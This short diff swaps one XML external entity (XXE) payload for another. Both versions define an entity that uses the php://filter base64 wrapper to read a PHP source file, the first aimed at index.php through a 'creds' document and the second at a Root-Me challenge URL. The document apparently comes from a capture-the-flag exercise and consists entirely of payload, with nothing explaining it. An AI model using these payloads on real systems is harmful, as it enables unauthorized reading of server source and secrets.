@@ -1,8 +1,9 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]>
-<creds>
-<user>&xxe;</user>
-<pass>mypass</pass>
-</creds>
+<?xml version="1.0"?>
+<!DOCTYPE results [
+    <!ENTITY harmless SYSTEM
+    "php://filter/read=convert.base64-encode/resource=http://challenge01.root-me.org/web-serveur/ch29/index.php"
+    >
+]>
+<results>
+    <result>&harmless;</result>
+</results>
